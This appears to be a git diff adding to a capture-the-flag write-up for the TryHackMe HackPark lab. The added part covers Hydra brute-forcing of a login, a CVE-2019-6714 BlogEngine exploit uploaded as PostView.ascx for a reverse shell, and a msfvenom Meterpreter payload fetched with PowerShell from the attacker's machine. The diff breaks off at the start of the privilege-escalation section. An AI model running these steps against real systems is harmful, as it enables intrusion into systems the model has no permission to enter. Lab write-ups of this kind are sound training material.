@@ -1,4 +1,4 @@
-# HackPark
+![image](https://github.com/jefftsui1/Cybersecurity-Home-Labs/assets/46698661/ec4a42d7-712d-4ea2-8b80-239d530432a7)# HackPark
 
 Room [HackPark](https://tryhackme.com/room/hackpark)
 
@@ -93,7 +93,6 @@ Question 1: What request type is the Windows website login form using?
 
 # Question 2
 
-
 Now we know the request type and have a URL for the login form, we can get started brute-forcing an account.
 
 But First we will highlight what we need for the hydra command.
@@ -142,6 +141,211 @@ Added in:
 
 - `:Login Failed` for login message.
 
+Successfully bruteforce the password
+
+<p align="center"> <img src="https://i.imgur.com/ixYx6YY.png" height="90%" width="90%" alt=""/>
 
 Question 2: Guess a username, choose a password wordlist and gain credentials to a user account!
+
+`1qaz2wsx`
+
+Cheatsheet for Hydra:
+
+<p align="center"> <img src="https://i.imgur.com/yKEMYKA.png" height="90%" width="90%" alt=""/>
+
+#
+
+# Compromise the machine Question
+
+Question 1: Now you have logged into the website, are you able to identify the version of the BlogEngine?
+
+Question 2: What is the CVE?
+
+Question 3: Who is the webserver running as?
+
+#
+
+# Question 1
+
+Login the webpage with "admin" as username and "1qaz2wsx" as password.
+
+Click on the three lines on the upper right corner > Select "ABOUT".
+
+<p align="center"> <img src="https://i.imgur.com/65ftqLd.png" height="90%" width="90%" alt=""/>
+
+Found the Version of BlogEngine used on the website.
+
+<p align="center"> <img src="https://i.imgur.com/lEm9hgI.png" height="90%" width="90%" alt=""/>
+
+Question 1: Now you have logged into the website, are you able to identify the version of the BlogEngine?
+
+`3.3.6.0`
+
+#
+
+# Question 2
+
+Use Exploit-DB to find the CVE.
+
+Google: "Exploit-DB BlogEngine 3.3.6 Reverse Shell" > Click on the first link.
+
+<p align="center"> <img src="https://i.imgur.com/W0MD86L.png" height="90%" width="90%" alt=""/>
+
+Found the CVE.
+
+<p align="center"> <img src="https://i.imgur.com/5wfoOOq.png" height="90%" width="90%" alt=""/>
+
+Question 2: What is the CVE?
+
+`CVE-2019-6714`
+
+#
+
+# Question 3
+
+
+Using the public exploit, gain initial access to the server.
+
+We will download the exploit on the Exploit-DB website.
+
+<p align="center"> <img src="https://i.imgur.com/wuxeAQJ.png" height="90%" width="90%" alt=""/>
+
+Move the exploit into our Project directionary.
+
+<p align="center"> <img src="https://i.imgur.com/394zclE.png" height="90%" width="90%" alt=""/>
+
+Open the exploit and edit it:
+
+Change the IP Address: "10.10.10.20" into your local machine IP.
+Change the Port: "444" into your preferred port.
+Save.
+
+<p align="center"> <img src="https://i.imgur.com/c8n9vXv.png" height="90%" width="90%" alt=""/>
+
+We will need to change the exploit's name and file type into "PostView.ascx". According to the comment stated in the exploit.
+
+<p align="center"> <img src="https://i.imgur.com/fNmhfM5.png" height="90%" width="90%" alt=""/>
+
+We will use the mv command again to change the name and type of the file.
+
+<p align="center"> <img src="https://i.imgur.com/cu1ceqN.png" height="90%" width="90%" alt=""/>
+
+We will use the `ncat` command in order to listen to port 1202 connection.
+
+<p align="center"> <img src="https://i.imgur.com/dnZxOEq.png" height="90%" width="90%" alt=""/>
+
+We now need to upload the "PostView.ascx" to the webpage.
+
+Navigate to the webpage > Click on the three lines > Select "CONTENT" > Click on the "Welcome to HackPark".
+
+<p align="center"> <img src="https://i.imgur.com/DBG3j1b.png" height="90%" width="90%" alt=""/>
+
+Click on "File manager".
+
+<p align="center"> <img src="https://i.imgur.com/6Ude17D.png" height="90%" width="90%" alt=""/>
+
+Click on "UPLOAD" > Find "PostView.ascx" > Upload.
+
+<p align="center"> <img src="https://i.imgur.com/1bzAugy.png" height="90%" width="90%" alt=""/>
+
+Like the exploit comment said: we have to go to `/?theme=../../App_Data/files` path on th webpage.
+
+<p align="center"> <img src="https://i.imgur.com/wiEz5eJ.png" height="90%" width="90%" alt=""/>
+
+Successfully got the shell with `ncat`.
+
+<p align="center"> <img src="https://i.imgur.com/f9iXA27.png" height="90%" width="90%" alt=""/>
+
+We can use `whoami` command to see who the webserver is running as.
+
+<p align="center"> <img src="https://i.imgur.com/jDXfD4f.png" height="90%" width="90%" alt=""/>
+
+Question 3: Who is the webserver running as?
+
+`iis apppool\blog`
+
+#
+
+#  Windows Privilege Escalation Question
+
+Question 1: What is the OS version of this windows machine?
+
+Question 2: What is the name of the abnormal service running?
+
+Question 3: What is the name of the binary you're supposed to exploit? 
+
+Question 4: What is the user flag (on Jeffs Desktop)?
+
+Question 5: What is the root flag?
+
+In this task we will learn about the basics of Windows Privilege Escalation.
+
+First we will pivot from netcat to a meterpreter session and use this to enumerate the machine to identify potential vulnerabilities. We will then use this gathered information to exploit the system and become the Administrator.
+
+#
+
+# Question 1
+
+First we will pivot from netcat to a meterpreter session and use this to enumerate the machine to identify potential vulnerabilities.
+
+On the terminal we will use msfvenom command.
+
+`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.6.106.187 LPORT=1337 -f exe > shell.exe`
+
+- `msfvenom`: This is a part of the Metasploit Framework used for generating payloads.
+
+- `-p windows/meterpreter/reverse_tcp`: Specifies the payload to be generated. In this case, it's a Windows Meterpreter reverse TCP shell, which allows the attacker to control a compromised system.
+
+- `LHOST=10.6.106.187`: Specifies the IP address of the listener (attacker's machine) to which the target system will connect back. Replace 10.6.106.187 with the actual IP address.
+
+- `LPORT=1337`: Specifies the port number on the listener (attacker's machine) where the connection will be received. Replace 1337 with the desired port number.
+
+- `-f exe`: Specifies the format of the output payload. In this case, it's set to generate an executable (.exe) file.
+
+- `> shell.exe`: Redirects the output to a file named shell.exe. The generated payload will be saved in this file.
+
+In summary, this msfvenom command is generating a Windows Meterpreter reverse TCP payload, configuring it to connect back to the specified IP address and port, and saving the output as an executable file named shell.exe. This payload can be used as part of a penetration test or ethical hacking activity to gain control over a Windows system. Always ensure that you have proper authorization before using such tools and payloads in any environment. Unauthorized use is illegal and unethical.
+
+<p align="center"> <img src="https://i.imgur.com/OFWI5X0.png" height="90%" width="90%" alt=""/>
+
+We will dump the "shell.exe" payload into the Windows/Temp directory on the shell. First we will use `cd` command to move to the directory `/Windows/Temp`.
+
+<p align="center"> <img src="https://i.imgur.com/A30V4N3.png" height="90%" width="90%" alt=""/>
+
+We will need to open up a new terminal and use the command:
+
+`python3 -m SimpleHTTPServer`
+
+<p align="center"> <img src="https://i.imgur.com/lEVwqk7.png" height="90%" width="90%" alt=""/>
+
+On the Shell terminal we will use:
+
+`powershell -c "Invoke-WebRequest -Uri 'http://10.6.106.187:8000/shell.exe' -OutFile 'C:/Windows/Temp/shell.exe'`
+- http://10.6.106.187 is our local machine.
+
+<p align="center"> <img src="https://i.imgur.com/3XmqMM1.png" height="90%" width="90%" alt=""/>
+
+We will now need to open up metasploit with `msfconsole` to exploit the payload on a new terminal. And follow the command:
+
+<p align="center"> <img src="https://i.imgur.com/IJhcJCb.png" height="90%" width="90%" alt=""/>
+
+Now we will need to go back to the shell terminal and run the "shell.exe" payload.
+
+`.\shell`
+- Successfully got into meterpreter on our local machine.
+
+<p align="center"> <img src="https://i.imgur.com/roHVxwF.png" height="90%" width="90%" alt=""/>
+
+We can use the `sysinfo` command to get the OS version.
+
+<p align="center"> <img src="https://i.imgur.com/YxbHtXa.png" height="90%" width="90%" alt=""/>
+
+Question 1: What is the OS version of this windows machine?
+
+`Windows 2012 R2 (6.3 Build 9600)`
+
+#
+
+# Question 2
+
 
